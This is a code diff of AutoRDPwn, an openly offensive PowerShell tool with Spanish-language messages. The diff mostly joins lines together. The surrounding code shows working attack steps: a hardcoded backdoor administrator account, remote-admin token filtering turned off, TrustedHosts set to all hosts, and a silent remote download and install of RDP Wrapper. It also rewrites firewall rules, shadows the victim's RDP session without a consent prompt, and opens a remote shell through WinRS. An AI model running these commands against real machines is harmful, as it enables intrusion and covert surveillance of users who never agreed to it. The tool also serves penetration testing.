@@ -183,12 +183,8 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
         
       } until ($input -in '1','2','3','4','5')
 
-   $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ""
-   if ($hash) { echo "AutoRDPwn" > credentials.dat 
-   $user = type credentials.dat ; $password = type credentials.dat | ConvertTo-SecureString -AsPlainText -Force ; del credentials.dat }
-   $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-   $RDP = New-PSSession -Computer $computer -credential $credential      
-   $Host.UI.RawUI.ForegroundColor = 'Yellow'
+   $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host "" ; if ($hash) { $user = AutoRDPwn ; $password = AutoRDPwn | ConvertTo-SecureString -AsPlainText -Force }
+   $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) ; $RDP = New-PSSession -Computer $computer -credential $credential ; $Host.UI.RawUI.ForegroundColor = 'Yellow'
    Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
    Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
    winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
@@ -267,8 +263,7 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
 
     invoke-command -session $RDP[0] -scriptblock {
     Invoke-WebRequest -Uri "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWInst-v1.6.2.msi" -OutFile "RDPWInst-v1.6.2.msi" -UseBasicParsing
-    msiexec /i "RDPWInst-v1.6.2.msi" /quiet /qn /norestart 
-    netsh advfirewall firewall delete rule name="Agente de sesión de RDP" 1> $null
+    msiexec /i "RDPWInst-v1.6.2.msi" /quiet /qn /norestart ; netsh advfirewall firewall delete rule name="Agente de sesión de RDP" 1> $null
     netsh advfirewall firewall add rule name="Agente de sesión de RDP" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 1> $null
     netsh advfirewall firewall add rule name="Agente de sesión de RDP" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 1> $null
     sleep -milliseconds 7500 ; rm .\RDPWInst-v1.6.2.msi 2> $null }
@@ -280,8 +275,7 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
     else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
 
-$session = get-pssession ; Write-Host ""
-if ($session){ Write-Host "Iniciando conexión remota.." -ForegroundColor Gray ; sleep -milliseconds 3000 
+$session = get-pssession ; Write-Host "" ; if ($session){ Write-Host "Iniciando conexión remota.." -ForegroundColor Gray ; sleep -milliseconds 3000 
 $PlainTextPassword = ConvertFrom-SecureToPlain $password
 if ($console){ Clear-Host ; Write-Host '>> Consola semi-interactiva en equipo remoto <<' ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host "Algo salió mal, cerrando el programa.." -ForegroundColor Red ; sleep -milliseconds 3000 }
